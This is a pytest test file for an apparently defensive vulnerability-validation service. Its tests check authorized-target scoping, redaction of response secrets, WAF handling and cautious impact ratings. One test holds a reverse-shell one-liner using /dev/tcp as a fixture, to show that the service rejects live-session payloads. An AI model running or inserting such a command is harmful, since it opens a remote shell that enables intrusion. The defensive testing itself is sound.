from __future__ import annotations

import json
import urllib.parse
from typing import Any

import pytest

from django_project.assets.models import Asset, AssetAuthorization
from django_project.evidence.models import Evidence, ValidationRun
from django_project.projects.models import Project
from django_project.scans.models import Scan
from django_project.users.models import User
from django_project.vulnerabilities.models import Vulnerability
from fastapi_app.services.offensive_validation import (
    ENGINE,
    SCHEMA,
    HTTPProbeResponse,
    ProbeRequest,
    run_offensive_validation,
    _proof_from_http,
    _verified_model_summary,
    _impact_assessment,
)


def _finding(*, status: str = Vulnerability.Status.OPEN, raw_data: dict[str, Any] | None = None) -> Vulnerability:
    user = User.objects.create_user(
        email=f'offensive-validation-{User.objects.count()}@example.invalid',
        password='Strong-Test-Password-123!',
    )
    project = Project.objects.create(
        name=f'Offensive Validation {Project.objects.count()}',
        slug=f'offensive-validation-{Project.objects.count()}',
        owner=user,
    )
    asset = Asset.objects.create(
        project=project,
        owner=user,
        name='Authorized Web Target',
        slug=f'authorized-web-target-{Asset.objects.count()}',
        type=Asset.Type.WEBSITE,
        configuration={'url': 'https://app.example/vulnerable'},
    )
    scan = Scan.objects.create(
        project=project,
        asset=asset,
        name='Browser finding scan',
        scan_type=Scan.Type.URL,
        status=Scan.Status.COMPLETED,
        engines=['browser-security'],
        config={'target': 'https://app.example/vulnerable'},
        initiated_by=user,
    )
    AssetAuthorization.objects.create(asset=asset, actor=user, authorized=True, target_snapshot=asset.configuration['url'], reason='Validation test grant')
    return Vulnerability.objects.create(
        scan=scan,
        project=project,
        asset=asset,
        title='Reflected XSS candidate',
        description='The browser engine observed a reflected XSS surface.',
        severity=Vulnerability.Severity.HIGH,
        status=status,
        confidence=Vulnerability.Confidence.UNVERIFIED,
        cwe_id='CWE-79',
        tags=['xss', 'offensive-validation'],
        url='https://app.example/vulnerable?existing=1',
        source_engine='browser-security',
        raw_data=raw_data or {'rule_id': 'browser.reflected-xss'},
    )


def _http_client(probe: ProbeRequest) -> HTTPProbeResponse:
    parsed = urllib.parse.urlparse(probe.url)
    params = urllib.parse.parse_qs(parsed.query)
    token = params.get('aegis_validation_token', [''])[0]
    body = f'<html>safe marker: {token}</html>' if probe.kind == 'reflected-token' else ''
    return HTTPProbeResponse(
        status=200,
        headers={'content-type': 'text/html; charset=utf-8', 'x-fixture': 'offensive-validation'},
        body=body,
        final_url=probe.url,
    )


@pytest.mark.django_db
def test_reflection_is_inconclusive_with_deterministic_evidence(monkeypatch):
    monkeypatch.setenv('AUTHORIZED_SCAN_TARGETS', 'app.example')
    finding = _finding(status=Vulnerability.Status.ACCEPTED_RISK)

    result = run_offensive_validation(finding=finding, actor=finding.scan.initiated_by, http_client=_http_client)

    finding.refresh_from_db()
    run = ValidationRun.objects.get(id=result['validation_run_id'])
    evidence = Evidence.objects.get(id=result['evidence_id'])
    payload = json.loads(evidence.raw_output)

    assert result['schema'] == SCHEMA
    assert result['engine'] == ENGINE
    assert result['status'] == 'completed'
    assert result['exploitability']['state'] == 'inconclusive'
    assert result['exploitability']['proven_count'] == 0
    assert result['probes'][1]['observation_confirmed'] is True
    assert run.status == ValidationRun.Status.COMPLETED
    assert run.progress == 100
    assert run.finding_id == finding.id
    assert evidence.finding_id == finding.id
    assert evidence.scan_id == finding.scan_id
    assert evidence.asset_id == finding.asset_id
    assert evidence.source == ENGINE
    assert evidence.evidence_type == 'exploitability_proof'
    assert evidence.metadata['runtime'] == {
        'live_session_opened': False,
        'unrestricted_shell_opened': False,
        'response_body_stored': False,
        'response_header_values_stored': False,
    }
    assert payload['schema'] == SCHEMA
    assert payload['runtime']['live_session_opened'] is False
    assert finding.status == Vulnerability.Status.ACCEPTED_RISK
    assert finding.validation_status == 'inconclusive'
    assert finding.confidence == Vulnerability.Confidence.UNVERIFIED
    assert finding.exploitability < 0.9
    assert finding.verified_evidence_count == 0

    second = run_offensive_validation(
        finding=finding,
        actor=finding.scan.initiated_by,
        validation_run=run,
        http_client=_http_client,
    )

    assert second['evidence_id'] == result['evidence_id']
    assert Evidence.objects.filter(finding=finding, source=ENGINE, evidence_type='exploitability_proof').count() == 1


@pytest.mark.django_db
def test_offensive_validation_blocks_live_session_payloads_before_persistence(monkeypatch):
    monkeypatch.setenv('AUTHORIZED_SCAN_TARGETS', 'app.example')
    finding = _finding(raw_data={'url': 'https://app.example/vulnerable', 'payload': 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'})

    with pytest.raises(ValueError, match='Live shell/session payloads'):
        run_offensive_validation(finding=finding, actor=finding.scan.initiated_by, http_client=_http_client)

    assert ValidationRun.objects.filter(finding=finding).count() == 0
    assert Evidence.objects.filter(finding=finding).count() == 0


@pytest.mark.django_db
def test_offensive_validation_rejects_unscoped_targets(monkeypatch):
    monkeypatch.setenv('AUTHORIZED_SCAN_TARGETS', 'approved.example')
    finding = _finding()

    with pytest.raises(ValueError, match='outside the server-side authorized scan scope'):
        run_offensive_validation(finding=finding, actor=finding.scan.initiated_by, http_client=_http_client)

    assert ValidationRun.objects.filter(finding=finding).count() == 0
    assert Evidence.objects.filter(finding=finding).count() == 0



def test_proof_emits_only_bounded_high_value_response_metadata():
    probe = ProbeRequest(kind='http-reachability', method='GET', url='https://app.example/vulnerable')
    response = HTTPProbeResponse(
        status=200,
        headers={
            'server': 'cloudflare',
            'x-powered-by': 'PHP/8.2',
            'x-debug-token': 'must-never-appear',
            'content-type': 'text/html',
        },
        body='<html>test page</html>',
        final_url=probe.url,
        response_bytes=4096,
    )
    result = _proof_from_http(probe, response, secrets_to_redact=())
    assert result.response_size_bytes == 4096
    assert result.response_size_kib == 4.0
    assert result.response_truncated is False
    assert result.technology_hints == ('Cloudflare', 'PHP')
    assert result.response_header_names == ('content-type',)
    assert 'must-never-appear' not in str(result)
    assert 'cloudflare' not in str(result.response_header_names)


def test_truncated_or_head_responses_never_claim_exact_size():
    get_probe = ProbeRequest(kind='http-reachability', method='GET', url='https://app.example/')
    head_probe = ProbeRequest(kind='http-reachability', method='HEAD', url='https://app.example/')
    truncated = HTTPProbeResponse(
        status=200, headers={'server': 'nginx'}, body='bounded text',
        final_url=get_probe.url, response_bytes=None, response_truncated=True,
    )
    proof = _proof_from_http(get_probe, truncated, secrets_to_redact=())
    assert proof.response_size_bytes is None
    assert proof.response_size_kib is None
    assert proof.response_truncated is True
    head = _proof_from_http(head_probe, HTTPProbeResponse(
        status=200, headers={'content-length': '10000000'}, body='',
        final_url=head_probe.url, response_bytes=0,
    ), secrets_to_redact=())
    assert head.response_size_bytes is None
    assert head.response_size_kib is None


def test_local_ai_evidence_gate_abstains_on_unproven_reflection():
    probe = ProbeRequest(kind='reflected-token', method='GET',
                         url='https://app.example/?aegis_validation_token=marker')
    response = HTTPProbeResponse(
        status=200, headers={'server': 'Cloudflare'},
        body='marker', final_url=probe.url, response_bytes=6,
    )
    candidate = _proof_from_http(probe, response, secrets_to_redact=())
    assert candidate.exploitability_proven is False
    assert _verified_model_summary([candidate], state='inconclusive') is None
    assert _verified_model_summary([candidate], state='confirmed') is None


def test_local_ai_evidence_gate_omits_raw_request_and_response():
    import hashlib
    landing = 'https://aegis-validation.invalid/safe-test'
    probe = ProbeRequest(
        kind='redirect-control', method='GET',
        url='https://app.example/redirect?opaque=private-marker',
        token_sha256=hashlib.sha256(landing.encode()).hexdigest(),
    )
    response = HTTPProbeResponse(
        status=302,
        headers={'server': 'nginx', 'location': landing, 'x-opaque': 'private-value'},
        body='private-response-body',
        final_url=probe.url,
        response_bytes=42,
    )
    verified = _proof_from_http(probe, response, secrets_to_redact=('private-marker',))
    assert verified.exploitability_proven is True
    summary = _verified_model_summary([verified], state='confirmed')
    assert summary is not None
    assert summary['schema'] == 'aegis.verified-model-evidence.v1'
    assert summary['proofs'][0]['response_size_kib'] == round(42 / 1024, 3)
    assert summary['proofs'][0]['unverified_technology_hints'] == ['Nginx']
    text = json.dumps(summary)
    for forbidden in ('private', 'https://', 'location', 'body', 'opaque'):
        assert forbidden not in text



def test_waf_signal_is_interference_not_exploit_or_safety_proof():
    probe = ProbeRequest(kind='reflected-token', method='GET',
                         url='https://app.example/search?aegis_validation_token=marker123')
    response = HTTPProbeResponse(
        status=403, headers={'server': 'cloudflare', 'cf-ray': 'sensitive-marker'},
        body='Request blocked', final_url=probe.url,
    )
    result = _proof_from_http(probe, response, secrets_to_redact=())
    assert result.access_interference == 'possible_waf_challenge'
    assert result.exploitability_proven is False
    assert result.observation_confirmed is False
    assert 'sensitive-marker' not in str(result)
    assert _verified_model_summary([result], state='inconclusive') is None


def test_generic_access_denial_does_not_fabricate_waf_identity():
    probe = ProbeRequest(kind='http-reachability', method='HEAD',
                         url='https://app.example/')
    response = HTTPProbeResponse(
        status=403, headers={'server': 'ordinary-app'}, body='',
        final_url=probe.url,
    )
    result = _proof_from_http(probe, response, secrets_to_redact=())
    assert result.access_interference == 'access_restricted_unattributed'
    assert result.exploitability_proven is False



def test_impact_rating_abstains_for_unproven_xss_or_waf_challenge():
    probe = ProbeRequest(
        kind='reflected-token', method='GET',
        url='https://app.example/?aegis_validation_token=safe1234',
    )
    candidate = _proof_from_http(probe, HTTPProbeResponse(
        status=403, headers={'server': 'Cloudflare'}, body='safe1234',
        final_url=probe.url,
    ), secrets_to_redact=())
    rating = _impact_assessment([candidate], state='inconclusive')
    assert rating['rating'] == 'unrated'
    assert rating['business_impact_verified'] is False
    assert rating['context_required'] is True


def test_impact_rating_is_provisional_for_verified_external_redirect():
    import hashlib
    landing = 'https://aegis-validation.invalid/safe-redirect'
    probe = ProbeRequest(
        kind='redirect-control', method='GET',
        url='https://app.example/redirect',
        token_sha256=hashlib.sha256(landing.encode()).hexdigest(),
    )
    result = _proof_from_http(probe, HTTPProbeResponse(
        status=302, headers={'location': landing}, body='',
        final_url=probe.url,
    ), secrets_to_redact=())
    assert result.exploitability_proven is True
    rating = _impact_assessment([result], state='confirmed')
    assert rating['rating'] == 'low'
    assert rating['business_impact_verified'] is False
    assert rating['context_required'] is True
